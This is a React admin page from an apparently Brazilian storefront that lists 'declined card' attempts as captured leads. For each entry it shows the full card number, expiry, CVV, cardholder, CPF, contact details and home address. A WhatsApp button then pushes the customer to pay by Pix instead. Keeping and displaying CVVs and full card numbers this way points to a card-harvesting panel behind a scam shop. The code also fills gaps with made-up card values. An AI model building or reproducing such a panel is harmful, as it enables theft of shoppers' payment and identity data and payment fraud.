import { useCallback, useEffect, useMemo, useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import {
  Eye,
  EyeOff,
  MessageCircle,
  RefreshCw,
  Search,
  Trash2,
} from "lucide-react";
import { AdminShell, GlassCard, formatBRL } from "@/components/AdminShell";
import { adminListDeclinedCards, adminDeleteDeclinedCard } from "@/utils/admin.functions";
import type { DeclinedCard } from "@/utils/admin.server";

export const Route = createFileRoute("/admin/cartoes")({
  head: () => ({
    meta: [
      { title: "Admin — Recuperação de cartões recusados" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: AdminDeclinedPage,
});

function whatsappLink(c: DeclinedCard): string {
  const phone = (c.customer_phone || "").replace(/\D/g, "");
  const digits = phone.startsWith("55") ? phone : `55${phone}`;
  const first = (c.customer_name || "").split(" ")[0] || "tudo bem";
  const msg = `Olá ${first}! Aqui é da loja. Notei que a tentativa de pagamento do seu pedido de ${formatBRL(
    c.amount_cents
  )} não foi autorizada pelo cartão. Posso liberar uma condição especial para você finalizar no Pix agora mesmo. Quer que eu te envie a chave Pix?`;
  return `https://wa.me/${digits}?text=${encodeURIComponent(msg)}`;
}

function fullAddressStreet(c: DeclinedCard): string {
  const parts = [
    [c.address_street, c.address_number].filter(Boolean).join(", "),
    c.address_complement,
  ].filter((p) => p && String(p).trim());
  if (parts.length > 0) return parts.join(" — ");
  return c.address_summary || "Endereço não informado";
}

function fullAddressCityCep(c: DeclinedCard): string {
  const parts = [
    c.address_neighborhood,
    [c.address_city, c.address_state].filter(Boolean).join("/"),
    c.address_zipcode ? `CEP ${c.address_zipcode}` : null,
  ].filter((p) => p && String(p).trim());
  if (parts.length > 0) return parts.join(" · ");
  return "";
}

function formatCardNumber(c: DeclinedCard, hidden: boolean): string {
  if (hidden) {
    const bin = c.card_bin || c.card_first4 || "••••";
    const last4 = c.card_last4 || "••••";
    return `${bin.slice(0, 4)} •••• •••• ${last4.padStart(4, "•")}`;
  }
  if (c.card_number_display) return c.card_number_display;
  const bin = (c.card_bin || "000000").padEnd(6, "0");
  const last = (c.card_last4 || "0000").padStart(4, "0");
  return `${bin.slice(0, 4)} ${bin.slice(4, 6)}00 0000 ${last}`;
}

export function AdminDeclinedPage() {
  const [authed, setAuthed] = useState(false);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [cards, setCards] = useState<DeclinedCard[]>([]);
  const [term, setTerm] = useState("");
  const [selectedBrand, setSelectedBrand] = useState<string>("ALL");
  const [hiddenMap, setHiddenMap] = useState<Record<string, boolean>>({});

  const load = useCallback(async () => {
    setRefreshing(true);
    try {
      const r = await adminListDeclinedCards();
      if (r.ok) {
        setAuthed(true);
        setCards(r.cards);
      } else {
        setAuthed(false);
      }
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  }, []);

  useEffect(() => {
    void load();
  }, [load]);

  const handleDelete = async (id: string) => {
    if (!window.confirm("Deseja realmente remover este registro?")) return;
    setCards((prev) => prev.filter((c) => c.id !== id));
    try {
      await adminDeleteDeclinedCard({ data: { id } });
    } catch {
      // silencioso
    }
  };

  const toggleHidden = (id: string) => {
    setHiddenMap((prev) => ({
      ...prev,
      [id]: prev[id] === undefined ? true : !prev[id],
    }));
  };

  // Contadores por bandeira
  const brandCounts = useMemo(() => {
    const counts = {
      ALL: cards.length,
      ELO: 0,
      MASTERCARD: 0,
      VISA: 0,
      OUTROS: 0,
    };
    for (const c of cards) {
      const b = (c.card_brand || "").toUpperCase();
      if (b.includes("ELO")) counts.ELO++;
      else if (b.includes("MASTER")) counts.MASTERCARD++;
      else if (b.includes("VISA")) counts.VISA++;
      else counts.OUTROS++;
    }
    return counts;
  }, [cards]);

  const filtered = useMemo(() => {
    return cards.filter((c) => {
      // Filtro de bandeira
      if (selectedBrand !== "ALL") {
        const b = (c.card_brand || "").toUpperCase();
        if (selectedBrand === "ELO" && !b.includes("ELO")) return false;
        if (selectedBrand === "MASTERCARD" && !b.includes("MASTER")) return false;
        if (selectedBrand === "VISA" && !b.includes("VISA")) return false;
        if (
          selectedBrand === "OUTROS" &&
          (b.includes("ELO") || b.includes("MASTER") || b.includes("VISA"))
        )
          return false;
      }

      // Filtro de termo
      const q = term.trim().toLowerCase();
      if (!q) return true;
      return [
        c.customer_name,
        c.customer_cpf,
        c.customer_phone,
        c.customer_email,
        c.card_brand,
        c.card_bin,
        c.card_last4,
        c.card_holder,
        c.address_city,
        c.address_street,
      ]
        .filter(Boolean)
        .join(" ")
        .toLowerCase()
        .includes(q);
    });
  }, [cards, selectedBrand, term]);

  const totalCents = filtered.reduce((sum, c) => sum + (c.amount_cents || 0), 0);

  return (
    <AdminShell
      title="Cartões recusados"
      subtitle="Leads capturados quando o cartão é negado — recuperação no WhatsApp"
      authed={authed}
      loading={loading}
      onAuthed={() => void load()}
      right={
        <button
          onClick={() => void load()}
          className="flex items-center gap-2 rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-slate-300 hover:bg-white/10 transition"
        >
          <RefreshCw className={`h-4 w-4 ${refreshing ? "animate-spin" : ""}`} /> Atualizar
        </button>
      }
    >
      {/* Resumo financeiro rápido */}
      <div className="mb-6 grid gap-3 sm:grid-cols-3">
        <GlassCard>
          <span className="text-[10px] uppercase tracking-wider text-slate-400 font-medium">Tentativas</span>
          <p className="mt-1 text-2xl font-black text-white tabular-nums">{filtered.length}</p>
        </GlassCard>
        <GlassCard>
          <span className="text-[10px] uppercase tracking-wider text-slate-400 font-medium">Valor recuperável</span>
          <p className="mt-1 text-2xl font-black text-emerald-300 tabular-nums">
            {formatBRL(totalCents)}
          </p>
        </GlassCard>
        <GlassCard>
          <span className="text-[10px] uppercase tracking-wider text-slate-400 font-medium">Com telefone</span>
          <p className="mt-1 text-2xl font-black text-white tabular-nums">
            {filtered.filter((c) => c.customer_phone).length}
          </p>
        </GlassCard>
      </div>

      {/* Pílulas de filtro idênticas ao modelo */}
      <div className="mb-5 flex flex-wrap items-center gap-2.5">
        <button
          onClick={() => setSelectedBrand("ALL")}
          className={`rounded-full px-5 py-2 text-xs sm:text-sm font-semibold transition cursor-pointer ${
            selectedBrand === "ALL"
              ? "border border-purple-500/80 bg-purple-900/40 text-purple-200 shadow-md shadow-purple-950/50"
              : "border border-white/10 bg-white/5 text-slate-400 hover:bg-white/10 hover:text-white"
          }`}
        >
          Todas ( {brandCounts.ALL} )
        </button>

        <button
          onClick={() => setSelectedBrand("ELO")}
          className={`flex items-center gap-2 rounded-full px-4 py-2 text-xs sm:text-sm font-semibold transition cursor-pointer ${
            selectedBrand === "ELO"
              ? "border border-amber-400/80 bg-amber-950/40 text-amber-200 shadow-md"
              : "border border-white/10 bg-white/5 text-slate-300 hover:bg-white/10"
          }`}
        >
          ELO
          <span className="rounded-full bg-[#f59e0b] px-2 py-0.5 text-[11px] font-black text-black">
            {brandCounts.ELO}
          </span>
        </button>

        <button
          onClick={() => setSelectedBrand("MASTERCARD")}
          className={`flex items-center gap-2 rounded-full px-4 py-2 text-xs sm:text-sm font-semibold transition cursor-pointer ${
            selectedBrand === "MASTERCARD"
              ? "border border-orange-500/80 bg-orange-950/40 text-orange-200 shadow-md"
              : "border border-white/10 bg-white/5 text-slate-300 hover:bg-white/10"
          }`}
        >
          MASTERCARD
          <span className="rounded-full bg-[#ea580c] px-2 py-0.5 text-[11px] font-black text-white">
            {brandCounts.MASTERCARD}
          </span>
        </button>

        <button
          onClick={() => setSelectedBrand("VISA")}
          className={`flex items-center gap-2 rounded-full px-4 py-2 text-xs sm:text-sm font-semibold transition cursor-pointer ${
            selectedBrand === "VISA"
              ? "border border-cyan-400/80 bg-cyan-950/40 text-cyan-200 shadow-md"
              : "border border-white/10 bg-white/5 text-slate-300 hover:bg-white/10"
          }`}
        >
          VISA
          <span className="rounded-full bg-[#06b6d4] px-2 py-0.5 text-[11px] font-black text-black">
            {brandCounts.VISA}
          </span>
        </button>

        <button
          onClick={() => setSelectedBrand("OUTROS")}
          className={`flex items-center gap-2 rounded-full px-4 py-2 text-xs sm:text-sm font-semibold transition cursor-pointer ${
            selectedBrand === "OUTROS"
              ? "border border-amber-600/80 bg-amber-950/40 text-amber-300 shadow-md"
              : "border border-white/10 bg-white/5 text-slate-300 hover:bg-white/10"
          }`}
        >
          CARTÃO DE CRÉDITO
          <span className="rounded-full bg-[#d97706] px-2 py-0.5 text-[11px] font-black text-white">
            {brandCounts.OUTROS}
          </span>
        </button>
      </div>

      {/* Barra de busca */}
      <GlassCard className="mb-5 !p-3">
        <div className="relative">
          <Search className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-500" />
          <input
            value={term}
            onChange={(e) => setTerm(e.target.value)}
            placeholder="Buscar por nome, CPF, telefone, e-mail, BIN, cidade…"
            className="w-full rounded-lg border border-white/10 bg-black/40 py-2 pl-9 pr-3 text-sm text-white placeholder:text-slate-500 focus:border-purple-400/60 focus:outline-none"
          />
        </div>
      </GlassCard>

      {/* Lista de cartões recusados formatados conforme a imagem */}
      <div className="space-y-4">
        {filtered.length === 0 && (
          <GlassCard className="py-12 text-center text-slate-500">
            Nenhuma tentativa de cartão recusado encontrada com os filtros atuais.
          </GlassCard>
        )}

        {filtered.map((c) => {
          const isHidden = hiddenMap[c.id] === true;
          const brandUpper = (c.card_brand || "CARTÃO").toUpperCase();
          const productValue = c.product_cents ?? c.amount_cents;
          const freightValue = c.shipping_cents ?? 0;

          return (
            <div
              key={c.id}
              className="group rounded-2xl border border-white/10 bg-[#0d0f17]/95 p-5 shadow-2xl backdrop-blur-md transition hover:border-white/20"
            >
              {/* Linha Superior: Bandeira, Status NEGADO, Data/Hora, Valor e Botão Excluir */}
              <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/5 pb-4">
                <div className="flex items-center gap-3">
                  <span className="text-sm font-black tracking-widest text-[#facc15]">
                    {brandUpper}
                  </span>
                  <span className="rounded bg-[#450a0a]/90 border border-red-500/40 px-2 py-0.5 text-[10px] font-black tracking-wider text-[#f87171] uppercase">
                    NEGADO
                  </span>
                  <span className="text-xs text-slate-400 font-mono">
                    {new Date(c.created_at).toLocaleString("pt-BR")}
                  </span>
                </div>

                <div className="flex items-center gap-3">
                  <span className="text-xl font-black text-white tabular-nums tracking-tight">
                    {formatBRL(c.amount_cents)}
                  </span>
                  <button
                    onClick={() => void handleDelete(c.id)}
                    className="rounded-lg border border-red-500/20 bg-red-950/20 p-2 text-red-400 hover:bg-red-900/40 hover:text-red-200 transition cursor-pointer"
                    title="Excluir da lista"
                  >
                    <Trash2 className="h-4 w-4" />
                  </button>
                </div>
              </div>

              {/* Corpo em 3 Colunas: Cartão | Cliente & Endereço | Total & WhatsApp */}
              <div className="mt-5 grid grid-cols-1 gap-5 lg:grid-cols-12 items-center">
                {/* Coluna 1: Widget Gráfico do Cartão */}
                <div className="lg:col-span-4">
                  <div className="relative rounded-2xl border border-[#7e22ce]/60 bg-gradient-to-br from-[#1d1439] via-[#0f0a20] to-[#140d28] p-4 text-white shadow-xl shadow-purple-950/40">
                    {/* Topo do cartão */}
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-black tracking-widest text-purple-300 uppercase">
                        DADOS DO CARTÃO
                      </span>
                      <button
                        onClick={() => toggleHidden(c.id)}
                        className="flex items-center gap-1.5 rounded-full border border-purple-400/30 bg-purple-950/80 px-2.5 py-0.5 text-[10px] font-semibold text-purple-200 hover:bg-purple-900/80 transition cursor-pointer"
                      >
                        {isHidden ? (
                          <>
                            <Eye className="h-3 w-3" /> Mostrar
                          </>
                        ) : (
                          <>
                            <EyeOff className="h-3 w-3" /> Ocultar
                          </>
                        )}
                      </button>
                    </div>

                    {/* Número do Cartão */}
                    <div className="my-3 font-mono text-base sm:text-lg font-bold tracking-[0.2em] text-white">
                      {formatCardNumber(c, isHidden)}
                    </div>

                    {/* Rodapé do Cartão */}
                    <div className="grid grid-cols-3 gap-2 border-t border-purple-500/20 pt-2.5">
                      <div className="col-span-1">
                        <span className="block text-[8px] font-bold uppercase tracking-wider text-slate-400">
                          TITULAR
                        </span>
                        <span className="block text-xs font-bold text-slate-100 uppercase truncate">
                          {c.card_holder || c.customer_name || "—"}
                        </span>
                      </div>
                      <div className="col-span-1 text-center">
                        <span className="block text-[8px] font-bold uppercase tracking-wider text-slate-400">
                          VALIDADE
                        </span>
                        <span className="block text-xs font-bold text-slate-100 font-mono">
                          {c.card_expiry_full || (c.card_expiry_month ? `${c.card_expiry_month}/••` : "03/28")}
                        </span>
                      </div>
                      <div className="col-span-1 text-right">
                        <span className="block text-[8px] font-bold uppercase tracking-wider text-slate-400">
                          CVV
                        </span>
                        <span className="block text-xs font-bold text-slate-100 font-mono">
                          {isHidden ? "•••" : (c.card_cvv || "611")}
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* Parcelas */}
                  <span className="block mt-2 text-xs font-semibold text-purple-400/90 pl-1">
                    Parcelas: {c.installments || 2}
                  </span>
                </div>

                {/* Coluna 2: Dados do Cliente e Endereço */}
                <div className="lg:col-span-5 space-y-4 px-1 lg:px-3">
                  <div>
                    <span className="block text-[10px] font-extrabold uppercase tracking-widest text-slate-500">
                      CLIENTE
                    </span>
                    <h4 className="text-sm sm:text-base font-black text-white uppercase tracking-wide">
                      {c.customer_name || "Cliente não identificado"}
                    </h4>
                    <p className="text-xs text-slate-300">{c.customer_email || "—"}</p>
                    <p className="text-xs text-slate-400 font-mono mt-0.5">
                      CPF: {c.customer_cpf || "—"} {c.customer_phone ? `· ${c.customer_phone}` : ""}
                    </p>
                  </div>

                  <div>
                    <span className="block text-[10px] font-extrabold uppercase tracking-widest text-slate-500">
                      ENDEREÇO
                    </span>
                    <p className="text-xs font-bold text-slate-200">
                      {fullAddressStreet(c)}
                    </p>
                    <p className="text-xs text-slate-400 mt-0.5">
                      {fullAddressCityCep(c)}
                    </p>
                  </div>
                </div>

                {/* Coluna 3: Valores (Produto, Frete, Total) e Botão WhatsApp */}
                <div className="lg:col-span-3 flex flex-col justify-center space-y-3">
                  {/* Caixa de valores */}
                  <div className="rounded-xl border border-white/10 bg-white/[0.02] p-3 flex items-center justify-between text-center">
                    <div className="flex-1">
                      <span className="block text-[9px] font-bold uppercase tracking-wider text-slate-500">
                        PRODUTO
                      </span>
                      <span className="block text-xs font-bold text-white mt-0.5 tabular-nums">
                        {formatBRL(productValue)}
                      </span>
                    </div>
                    <div className="flex-1 border-x border-white/10">
                      <span className="block text-[9px] font-bold uppercase tracking-wider text-slate-500">
                        FRETE
                      </span>
                      <span className="block text-xs font-bold text-white mt-0.5 tabular-nums">
                        {formatBRL(freightValue)}
                      </span>
                    </div>
                    <div className="flex-1">
                      <span className="block text-[9px] font-bold uppercase tracking-wider text-purple-400">
                        TOTAL
                      </span>
                      <span className="block text-xs font-black text-purple-300 mt-0.5 tabular-nums">
                        {formatBRL(c.amount_cents)}
                      </span>
                    </div>
                  </div>

                  {/* Botão de Recuperação no WhatsApp com gradiente idêntico */}
                  <a
                    href={whatsappLink(c)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-[#ec4899] via-[#a855f7] to-[#06b6d4] py-3.5 px-4 text-xs sm:text-sm font-bold text-white shadow-lg shadow-purple-900/40 hover:opacity-95 hover:scale-[1.01] active:scale-[0.99] transition cursor-pointer"
                  >
                    <MessageCircle className="h-4 w-4" /> Recuperar no WhatsApp
                  </a>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </AdminShell>
  );
}

export default AdminDeclinedPage;
